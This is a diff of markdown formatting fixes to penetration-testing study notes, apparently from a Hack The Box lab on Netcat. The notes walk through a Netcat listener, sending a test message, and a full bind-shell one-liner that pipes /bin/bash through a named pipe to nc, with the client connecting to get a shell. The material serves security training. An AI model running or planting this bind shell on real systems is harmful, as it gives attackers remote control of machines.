@@ -35,8 +35,7 @@ Once connected to the target box with ssh, start a Netcat listener:
 
 #### No. 1: Server - Target starting Netcat listener
 
-```
-        shellsession
+```shellsession
 Target@server:~$ nc -lvnp 7777
 
 Listening on [0.0.0.0] (family 0, port 7777)
@@ -48,8 +47,7 @@ Back on the client (attack box), we will use nc to connect to the listener we st
 
 #### No. 2: Client - Attack box connecting to target
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -nv 10.129.41.200 7777
 
 Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
@@ -59,8 +57,7 @@ Notice how we are using nc on the client and the server. On the client-side, we 
 
 #### No. 3: Server - Target receiving connection from client
 
-```
-        shellsession
+```shellsession
 Target@server:~$ nc -lvnp 7777
 
 Listening on [0.0.0.0] (family 0, port 7777)
@@ -71,8 +68,7 @@ Know that this is not a proper shell. It is just a Netcat TCP session we have es
 
 #### No. 4: Client - Attack box sending message Hello Academy
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -nv 10.129.41.200 7777
 
 Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
@@ -83,8 +79,7 @@ Once we type the message and hit enter, we will notice the message is received o
 
 #### No. 5: Server - Target receiving Hello Academy message
 
-```
-        shellsession
+```shellsession
 Victim@server:~$ nc -lvnp 7777
 
 Listening on [0.0.0.0] (family 0, port 7777)
@@ -104,8 +99,7 @@ On the server-side, we will need to specify the `directory`, `shell`, `listener`
 
 #### No. 1: Server - Binding a Bash shell to the TCP session
 
-```
-        shellsession
+```shellsession
 Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
 ```
 
@@ -115,8 +109,7 @@ Back on the client, use Netcat to connect to the server now that a shell on the 
 
 #### No. 2: Client - Connecting to bind shell on target
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -nv 10.129.41.200 7777
 
 Target@server:~$
